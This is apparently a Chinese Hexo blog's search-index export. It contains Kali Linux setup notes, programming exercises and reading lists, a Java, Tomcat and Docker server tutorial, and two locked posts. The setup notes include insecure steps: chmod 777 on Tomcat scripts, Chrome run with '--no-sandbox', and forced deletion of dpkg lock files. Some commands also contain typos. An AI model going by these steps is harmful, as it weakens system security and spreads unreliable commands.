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]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转kali系统]]></title>
    <url>%2F%E7%8E%A9%E8%BD%ACkali%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[conky apt-get install conky-all conky-manager git clone git://github.com/zenzire/conkyrc.git ~/.conky ln -s ~/.conky/conkyrc ~/.conkyrc vim conkyrc conky-manager 参考：http://blog.sina.com.cn/s/blog_69e5d8400102vr0x.html apt install fonts-wqy-microhei apt install ttf-mscorefonts-installer https://www.fujieace.com/kali-linux/sogou-pinyin.html https://blog.csdn.net/yanghuan313/article/details/51276343 https://www.jianshu.com/p/df2ef78db06d 软件安装 安装任何软件之前必须先更新目录 apt-get updata apt-get full-upgrade 反复运行以上两行命令 更新源：cat/etc/apt/source.list官方： 库安装 apt install packge_name安装DEB安装包 dpkg -i name.deb apt install ./name.deb (首选)常用工具 apt install mtr whois gcc git curl -y 安全工具安装全部安全软件 apt install kali-linux-all 翻译软件apt install goldendict 增强开机启动gnome-tweaks 办公软件 apt install libreoffice WPS for Linux onlyoffice Desktop https://www.onlyoffice.com/download-desktop.aspx apt install ./onlyoffice_XXXXXX 安装JAVA add-apt-respository ppa:webupd8team/java sudo apt-get update sudo apt-get install java-common oracle-java8-install sudo apt-get install oracle=java8-set-default 共享文件夹 apt-get install open-vm-tools-dkms vmhgfs-fuse .host:/ /mnt/hgfs PS：当需要挂载的目录下不为空时，fuse就会提醒你： willing@willing:~/fuse/example$ ./hello tmpfuse: mountpoint is not emptyfuse: if you are sure this is safe, use the ‘nonempty’ mount option willing@willing:~/fuse/example$ ./hello -o nonempty tmpfuse: warning: library too old, some operations may not not work 或者 进入下一级的目录，是当前文件夹为空！ 建立文件夹桌面快捷方式sudo ln -s /home/gaoyulong/Datums/linuxDatums/file_name /home/gaoyulong/Desktop 以上指令是创建软链接到桌面/指定文件夹下。 无法锁定管理目录(/var/lib/dpkg/)，是否有其他进程正占用它？ #:sudo rm /var/cache/apt/archives/lock #:sudo rm /var/lib/dpkg/lock BASH命令-管道和shell脚本 对.sh脚本进行 群像赋予 +x for n in ‘seq 9’ 对内进行取值，1~9。 ping 脚本命令：ping 192.168.1.1 -c 1 | grep tll | awk ‘{print $4}’ | awk -F: ‘{print $1}’ -c 1 鄙视只ping一个包 awk ‘{print $4}’ 摘取只有ip的段 awk -F: ‘{print $1}’ 显示活着的主机ip 浏览器插件使用 hashr F9 即可调用，申请了注入等操作 Firefox 中文语言包安装方法Firefox 中文语言包安装方法 http://releases.mozilla.org/pub/firefox/releases/60.2.0esr/linux-x86_64/xpi/ PS:最后一个符号 / 一定要加，版本号60.2.0esr/linux-x86_64 这个自查！ chrome浏览器的启动似乎必须使用此命令：google-chrome-stable –no-sandbox]]></content>
      <categories>
        <category>kali</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[左耳朵大叔推荐的实战项目]]></title>
    <url>%2F%E5%B7%A6%E8%80%B3%E6%9C%B5%E5%A4%A7%E5%8F%94%E6%8E%A8%E8%8D%90%E7%9A%84%E5%AE%9E%E6%88%98%E9%A1%B9%E7%9B%AE%2F</url>
    <content type="text"><![CDATA[程序员练级攻略（2018）实践项目一无论你用Python，还是Node.js，还是PHP，我希望你能做一个非常简单的Blog系统，或是BBS系统，需要支持如下功能： 用户登录和注册（不需密码找回）。 用户发贴（不需要支持富文本，只需要支持纯文本）。 用户评论（不需要支持富文本，只需要支持纯文本）。 你需要从前端一直做到后端，也就是说，从HTML/CSS/JavaScript，到后面的PHP（Python/Node.js），再到数据库。这其中需要你查阅很多的知识。 这里有几个技术点你需要关注一下 用户登录时的密码不应该保存为明文，应该用MD5+Salt来保存（关于这个是什么，希望你能自行Google）. 用户登录后，对于用户自己的贴子可以有 “重新编辑” 或 “删除” 的功能，但是无权编辑或删除其它用户的贴子。 数据库的设计，你需要三张表：用户表、文章表和评论表，它们之间是怎么关联的，你需要学习一下。- 这里有个PHP的blog教你怎么建表，你可以 前往一读。 如果你有兴趣，你可以顺着这个小项目，研究一下下面这几个事： 图片验证码。 上传图片。 阻止用户在发文章或评论时输入带HTML或JavaScript的内容。 防范SQL注入。参看 PHP官方文档 或 微软官方文档 ，或者你自己Google一下。 上面这些东西，不是什么高深的东西，但是可以让你从中学到很多东西。相信你只需要自己Google一下就能搞定。 实践项目二这回我们需要设计一个投票系统的项目。 业务上的需求如下： 用户只有在登录后，才可以生成投票表单。 投票项可以单选，可以多选。 其它用户投票后显示当前投票结果（但是不能刷票）。 投票有相应的时间，页面上需要出现倒计时。 投票结果需要用不同颜色不同长度的横条，并显示百分比和人数。 技术上的需求如下： 这回要用Java Spring Boot来实现了，然后，后端不返回任何的HTML，只返回JSon数据给前端。 由前端的JQuery来处理并操作相关的HTML动态生成在前端展示的页面。 前端的页面还要是响应式的，也就是可以在手机端和电脑端有不同的呈现。 这个可以用Bootstrap来完成。 如果你有兴趣，还可以挑战以下这些功能： 在微信中，通过微信授权后记录用户信息，以防止刷票。 可以不用刷页面，就可以动态地看到投票结果的变化。 Google一些画图表的JavaScript库，然后把图片表得风骚一些。 实践项目三我们已经学习完了编程语言、理论学科和系统知识三部分内容，下面就来做几个实践项目，小试牛刀一下。实现语言可以用C、C++或Java。 实现一个telnet版本的聊天服务器，主要有以下需求。 每个客户端可以用使用telnet ip:port的方式连接到服务器上。 新连接需要用用户名和密码登录，如果没有，则需要注册一个。 然后可以选择一个聊天室加入聊天。 管理员有权创建或删除聊天室，普通人员只有加入、退出、查询聊天室的权力。 聊天室需要有人数限制，每个人发出来的话，其它所有的人都要能看得到。 实现一个简单的HTTP服务器，主要有以下需求。 解释浏览器传来的HTTP协议，只需要处理URL path。 然后把所代理的目录列出来。 在浏览器上可以浏览目录里的文件和下级目录。 如果点击文件，则把文件打开传给浏览器（浏览器能够自动显示图片、PDF，或HTML、CSS、JavaScript以及文本文件）。 如果点击子目录，则进入到子目录中，并把子目录中的文件列出来。 实现一个生产者/消费者消息队列服务，主要有以下需求。 消息队列采用一个Ring-buffer的数据结构。 可以有多个topic供生产者写入消息及消费者取出消息。 需要支持多个生产者并发写。 需要支持多个消费者消费消息（只要有一个消费者成功处理消息就可以删除消息）。 消息队列要做到不丢数据（要把消息持久化下来）。 能做到性能很高。]]></content>
      <categories>
        <category>左耳朵耗子</category>
      </categories>
      <tags>
        <tag>实战项目</tag>
        <tag>左耳朵耗子</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[左耳朵大叔介绍的书籍、文章、网站]]></title>
    <url>%2F%E5%B7%A6%E8%80%B3%E6%9C%B5%E5%A4%A7%E5%8F%94%E4%BB%8B%E7%BB%8D%E7%9A%84%E4%B9%A6%E7%B1%8D%E3%80%81%E6%96%87%E7%AB%A0%E3%80%81%E7%BD%91%E7%AB%99%2F</url>
    <content type="text"><![CDATA[程序员练级攻略（2018） 《Teach Yourself Programming in Ten Years》 (中文版)十年学会编程 “ The Key To Accelerating Your Coding Skills”：快速提高自己的编程能力 《程序员的荒谬之言还是至理名言？》学习建议 一定要坚持，要保持长时间学习，甚至终生学习的态度。 一定要动手，不管例子多么简单，建议至少自己动手敲一遍看看是否理解了里头的细枝末节。 一定要学会思考，思考为什么要这样，而不是那样。还要举一反三地思考。 不要乱买书，不要乱追新技术新名词，基础的东西经过很长时间积累，会在未来至少10年通用。 回顾一下历史，看看历史时间线上技术的发展，你才能明白明天会是什么样的。程序员的修养 What are some of the most basic things every programmer should know? 《97 Things Every Programmer Should Know》在线编程入门的网站 Codecademy: Learn Python People Can Program CodeAbbey 编程练习 Mozilla Developer Network 的 Web开发入门入门学习JavaScript MDN JavaScript教程 W3School JavaScript教程 JavaScript全栈教程（廖雪峰） 前后端 CSS文档 HTML文档 W3Schools的JavaScript HTML DOM的教程 W3School的PHP教程 PHP的官网文档写代码的修养 《重构：改善既有代码的设计》 《修改代码的艺术》 《代码整洁之道》 《程序员的职业素养》 不错的Code Review的文章 Code Review Best Practices. How Google Does Code Review LinkedIn’s Tips for Highly Effective Code ReviewUnit Test的不错文章 You Still Don’t Know How to Do Unit Testing Unit Testing Best Practices: JUnit Reference Guide JUnit Best Practices学习JUnit JUnit User Guide(官网) 中文版(官网) 工具编程的IDE Eclipse（教程） Intellij IDEA（教程） Visual Studio Code版本管理工具 Pro Git 第二版 ：非常系统,首选 猴子都能懂的Git入门 Git环境安装和准备以及GitHub使用： Github and Git 图文教程 Git图文教程及详解调试前端程序 超完整的Chrome浏览器客户端调试大全数据库设计工具MySQL WorkBench官方文档 安全Web OWASP - Open Web Application Security ProjectHTTP 《Hardening Your HTTP Security Headers》安全编程 伯克立大学的Secure Coding Practice Guidelines 卡内基梅隆大学的 SEI CERT Coding Standards防御性编程(维基百科) The Art of Defensive Programming Overly defensive programming测试 《完美软件：对软件测试的各种幻想》 《Google软件测试之道》上线Checklist Server Side checklist Single Page App Checklist运维方面的入门文章 《Monitoring 101》:告诉你最基本的监控线上运行软件的方法和实践。 各种语言的编程规范 各种语言的编程规范 编程语言Java语言 《Java核心技术：卷1基础知识》 《Spring实战》 《Spring Boot实战》 《Effective Java》 Google Guava 库 《Java并发编程实战》 《Java性能权威指南》 《深入理解Java虚拟机》 《Java编程思想》 《精通Spring 4.x》 《设计模式》 《Head First设计模式》 C/C++语言 《C程序设计语言》C语言之父Dennis M. Ritchie和著名科学家Brian W. Kernighan 《C语言程序设计现代方法》 《C陷阱与缺陷》 “C++的坑真的多吗？” 《C++ Primer中文版》 《Effective C++》 《More Effective C++》 《深度探索C++对象模型》 《C++虚函数表解析》 《C++对象内存布局》 《C++ FAQ》Bjarne Stroustrup 《C++ FAQ》(中文版) Go语言 Go by Example：入门 Go 101 The Go Programming Language “GO 语言简介（上）- 语法”：参考 “GO 语言简介（下）- 特性”：参考 Effective Go：必读 Go精华文章列表(Github) Go相关博客列表(Github) Go Talks(Github) Go资源列表 Awesome Go(Github) 理论学科算法、数据结构、网络模型、计算机原理等这样的计算机科学专业需要学习的理论知识是必须要学习的 数据结构和算法基础知识 《算法》 《算法图解》 理论加持 《算法导论》 思维改善 《编程珠玑》 基础算法题其中有大量的算法题，解这些题都是有套路的，不是用递归（深度优先DFS，广度优先BFS），就是要用动态规划（Dynamic Programming），或是折半查找（Binary Search），或是回溯（Back tracing），或是分治法（Divide and Conquer），还有大量的对树、数组、链表、字符串和hash表的操作。通过做这些题能让你对这些最基础的算法的思路有非常扎实的了解和训练。对我而言，Dynamic Programming是我的短板，尤其是一些比较复杂的问题，在推导递推公式上总是有思维的缺陷（数学是我的硬伤）。做了这些题后，我能感到我在动态编程的思路上受到了很大的启发。 编程题比如：atoi，strstr，add two nums，括号匹配，字符串乘法，通配符匹配，文件路径简化，Text Justification，反转单词等，这些题的Edge Case和Corner Case有很多。这些题需要你想清楚了再干，只要你稍有疏忽，就会有几个case让你痛不欲生，而且一不小心就会让你的代码写得又臭又长，无法阅读。通过做这些题，可以非常好地训练你对各种情况的考虑，以及你对程序代码组织的掌控（其实就是其中的状态变量）。 Leetcode Github List of Algorithms(算法字典) Data Structure Visualizations(数据结构动画图) 其它理论基础知识 《数据结构与算法分析》 《数据库系统概念》 《现代操作系统》 《计算机网络》 《计算机程序的构造和解释》 《编译原理》 计算机系统相关知识 《深入理解计算机系统》原名：《Computer Systems A Programmer’s Perspective》:程序员必读入门 《Linux C编程一站式学习》 《TCP/IP网络编程》 《图解TCP/IP》 《The TCP/IP Guide》 《Wireshark数据包分析实战》:抓包相关深入 《Unix高级环境编程》 《Unix网络编程》 第1卷 套接口API 《Unix网络编程》第2卷 进程间通信 《TCP/IP详解 卷I 协议》 《Linux/Unix系统编程手册》 Linux System Programming 英文电子版 中文翻译版Linux系统编程 “C10K Problem （中文翻译版）” The Secret To 10 Million Concurrent Connections -The Kernel Is The Problem, Not The Solution:C10M问题]]></content>
      <categories>
        <category>书籍</category>
      </categories>
      <tags>
        <tag>左耳朵耗子</tag>
        <tag>书籍</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[服务器环境搭建]]></title>
    <url>%2F%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[１、搭建 Java 开发环境此实验教大家如何配置 JDK 、Tomcat 和 Mysql ### 安装 JDK JDK 是开发Java程序必须安装的软件，我们查看一下 yum 源里面的 JDK： yum list java*选择适合本机的JDK，并安装： yum install java-1.7.0-openjdk* -y安装完成后，查看是否安装成功： java -version ### Tomcat Tomcat 是一个应用服务器，是开发和调试 jsp 程序的首选，可以利用它来响应 HTML 页面的访问请求。 进入本地文件夹 cd /usr/local到官网找到 Tomcat 的下载链接，并下载到服务器中, 这里提供了一个快速下载 Tomcat 的地址： wget https://mc.qcloudimg.com/static/archive/fa66329388f85c08e8d6c12ceb8b2ca3/apache-tomcat-7.0.77.tar.gz解压这个文件夹： tar -zxf apache-tomcat-7.0.77.tar.gz重命名这个文件[?]： mv apache-tomcat-7.0.77 /usr/local/tomcat7进入 bin 文件夹 cd /usr/local/tomcat7/bin给这个文件夹下的所有 shell 脚本授予权限： chmod 777 *.sh开启tomcat服务： ./startup.sh 重命名是为了方便后续操作, 并非必须步骤 ### 安装 MySQL 使用 yum 安装 MySQL： yum install -y mysql-server mysql mysql-devel安装完成后，启动 MySQL 服务： service mysqld restart设置 MySQL 账户 root 密码：[?] /usr/bin/mysqladmin -u root password ‘Password’ 下面命令中的密码是教程为您自动生成的，为了方便实验的进行，不建议使用其它密码。如果设置其它密码，请把密码记住。 ### Tomcat访问 Tomcat 此时，访问 http://&lt;您的 CVM IP 地址&gt;:8080 可访问到刚才启动的 Tomcat 的内置示例页面 大功告成！恭喜！您已经成功完成了搭建 Java Web 开发环境的实验任务。 2、安装与配置 Docker安装 DockerDocker 软件包已经包括在默认的 CentOS-Extras 软件源里。因此想要安装 docker，只需要运行下面的 yum 命令： yum install docker-io -y直接yum安装，安装成功后查看版本 docker -v启动docker service docker start设置开机启动 chkconfig docker on 配置 Docker因为国内访问 Docker Hub 较慢, 可以使用腾讯云提供的国内镜像源, 加速访问 Docker Hub 依次执行以下命令 echo “OPTIONS=’–registry-mirror=https://mirror.ccs.tencentyun.com&#39;&quot; &gt;&gt; /etc/sysconfig/dockersystemctl daemon-reloadservice docker restart Docker 的简单操作任务时间：10min ~ 20min 下载镜像下载一个官方的 CentOS 镜像到本地 docker pull centos下载好的镜像就会出现在镜像列表里 docker images 运行容器这时我们可以在刚才下载的 CentOS 镜像生成的容器内操作了。 生成一个 centos 镜像为模板的容器并使用 bash shell docker run -it centos /bin/bash这个时候可以看到命令行的前端已经变成了 [root@(一串 hash Id)] 的形式, 这说明我们已经成功进入了 CentOS 容器。 在容器内执行任意命令, 不会影响到宿主机, 如下 mkdir -p /data/simple_docker可以看到 /data 目录下已经创建成功了 simple_docker 文件夹 ls /data 退出容器exit查看宿主机的 /data 目录, 并没有 simple_docker 文件夹, 说明容器内的操作不会影响到宿主机 ls /data 保存容器查看所有的容器信息， 能获取容器的id docker ps -a然后执行如下命令[?]，保存镜像： docker commit -m=”备注” 你的CONTAINER_ID 你的IMAGE 请自行将 -m 后面的信息改成自己的容器的信息 大功告成！恭喜你结束了 Docker 的教程并学会了 Docker 的一些基本操作, 接下来, 您可以购买并体验腾讯云提供的 Docker 服务]]></content>
      <categories>
        <category>运维</category>
      </categories>
      <tags>
        <tag>服务器环境</tag>
        <tag>运维0</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[程序员练级攻略之笔记]]></title>
    <url>%2F%E7%A8%8B%E5%BA%8F%E5%91%98%E7%BB%83%E7%BA%A7%E6%94%BB%E7%95%A5%E4%B9%8B%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[专业基础篇内容简介：在编程语言方面，推荐学习C、C++和Java这三个工业级的程语言。理论学科方面，需要学习算法、数据结构、网络模型、计算机原理等内容。系统知识方面会讲述 Unix/Linux 、 TCP/IP 、 C10K 挑战等专业的系统知识。 最后给出了你可以选择的几大从业方向。 如果你对操作系统、文件系统、数据库、网络等比较感兴趣，那么可以考虑从事底层方面的工作。 如果对分布式系统架构、微服务、DevOps、Cloud Native等有热情，那么可以从事架构方面的工作。 如果是对大数据、机器学习、人工智能等比较关注，那么数据领域可以成为你一展身手的地方。 如果你对用户体验或者交互等更感兴趣，那么前端工程师也是个不错的选择。 此外，安全开发、运维开发、嵌入式开发等几大方向中，也为你提供了丰富多彩的发展空间。 与孩子一起学编程 这本书以Python语言教你如何写程序，是一本老少咸宜的编程书。其中会教你编一些小游戏，还会和你讲基本的编程知识，相当不错。 两个在线编程入门的网站： Codecademy: Learn Python 和 People Can Program ，你也可以在这两个网站上学习Python，只不过是英文的。 在线编程的小练习可以到 CodeAbbey 上去做一些在线编程的小练习。 ###### 第二份入门教程，做个网页吧。MDN的 Web开发入门 MDN全称是Mozilla Developer Network，你可以认为是Web方面的官方技术网站。这个教程会带着你建立一个网站。然后，你可以把你的网页发布在GitHub上。这两份教程都很不错，都是从零开始，带着你从环境准备开发，一点一点地从一些简单而有意的东西入手，让你感觉一下编程世界是什么样的，相信这两个教程可以让零基础的你喜欢上编程。 提高英文能力的建议 1、坚持Google英文关键词，而不是在Google里搜中文。 2、在GitHub上只用英文。用英文写代码注释，写Code Commit信息，用英文写Issue和Pull Request，以及用英文写Wiki。 3、坚持到YouTube上每天看5分钟的视频。YouTube上有相关的机器字幕，实在不行就打开字幕。 4、坚持用英文词典而不是中文的。比如：剑桥英语词典 或是 Dictionary.com 。你可以安装一个Chrome插件 Google Dictionary 。 5、坚持用英文的教材而不是中文的。比如：BBC 的 Learning English ，或是到一些ESL网站上看看，如 ESL: English as a Second Language 上有一些课程。 6、花钱参加一些线上的英文课程，用视频和老外练习。 编程规范我们在写代码时，最好参考一些已有的最佳实践。为什么要有编程规范和最佳实践，要让所有人按一定的规范来编程呢？有下面几个主要原因。 可以让你的代码很规整，这有利于代码易读性，从而可以更容易地维护。 提升开发效率，我们知道，效率来自于结构化，而不是杂乱。 可以让你的软件避免一些容易掉坑的陷阱，也让Bug更少，质量更高。 可以让团队成员更高效率地协作。 一些学习要点 学习HTML基本语法。 学习CSS如何选中HTML元素并应用一些基本样式。 学会用 Firefox + Firebug 或 Chrome 查看你觉得很炫的网页结构，并动态修改。 在一台Linux机器上配置LEMP - Ubuntu/Nginx/PHP/MySQL这个环境。 学习PHP，让后台PHP和前台HTML进行数据交互，对服务器相应浏览器请求形成初步认识。实现一个表单提交和反显的功能。 把PHP连接本地或者远程数据库 MySQL（MySQL 和 SQL现学现用够了）。这里，你可能会问我，入门时有三个后端语言，一个是Python，一个是Node.js，一个是PHP，你对这三门语言怎么看？老实说，Python我还看好一些，PHP次之，Node.js最后。原因是： Python语言的应用面还是很多的。（当然，性能可能会有一些问题，但是用于一些性能不敏感的和运维或是一些小工具相关的，还是非常好用的。另外，Python的应用场景其实还是很多的，包括机器学习和AI也有Python的身影。用Python来做一些爬虫、简单的中间件、应用或是业务服务也是很不错的。） PHP也是一个比较主流的简单的语言（PHP在目前来说还是一个比较主流的语言，但其发展潜力有限，虽然可以让你找得到工作，但是一般玩玩就行了）。 Node.js 号称 JavaScript 的后端版，但从目前发展来说，在后端的世界里，并不能承担大任，而且问题很多。一些前端程序员用它来做后端的粘合层，我个人觉得这样做法只是掩盖前后端配合有问题，或是接口设计思维上的懒惰，我还是希望前端程序员应该认真学习一门真正的后端语言。 入门级的编程知识入门级的编程知识(有道笔记) 23个设计模式学习面向对象的设计模式时，你不要迷失在那23个设计模式中，你一定要明白这两个原则： Program to an ‘interface’, not an ‘implementation’ 使用者不需要知道数据类型、结构、算法的细节。 使用者不需要知道实现细节，只需要知道提供的接口。 利于抽象、封装，动态绑定，多态。符合面向对象的特质和理念。 Favor ‘object composition’ over ‘class inheritance’ 继承需要给子类暴露一些父类的设计和实现细节。 父类实现的改变会造成子类也需要改变。 我们以为继承主要是为了代码重用，但实际上在子类中需要重新实现很多父类的方法。 继承更多的应该是为了多态。 系统知识一些学习要点 用这些系统知识操作一下文件系统，实现一个可以拷贝目录树的小程序。 用fork / wait / waitpid写一个多进程的程序，用pthread写一个多线程带同步或互斥的程序。比如，多进程购票的程序。 用signal / kill / raise / alarm / pause / sigprocmask实现一个多进程间的信号量通信的程序。 学会使用gcc和gdb来编程和调试程序（参看我的《用gdb调试程序》）。 学会使用makefile来编译程序（参看我的《跟我一起写makefile》）。 Socket的进程间通信。用C语言写一个1对1的聊天小程序，或是一个简单的HTTP服务器。]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>练级攻略</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[苏州之行]]></title>
    <url>%2F%E8%8B%8F%E5%B7%9E%E4%B9%8B%E8%A1%8C%2F</url>
    <content type="text"><![CDATA[请输入访问密匙 Decrypt ]]></content>
      <categories>
        <category>思考</category>
      </categories>
      <tags>
        <tag>思考</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[8月幸会，一次总结]]></title>
    <url>%2F8%E6%9C%88%E5%B9%B8%E4%BC%9A%EF%BC%8C%E4%B8%80%E6%AC%A1%E6%80%BB%E7%BB%93%2F</url>
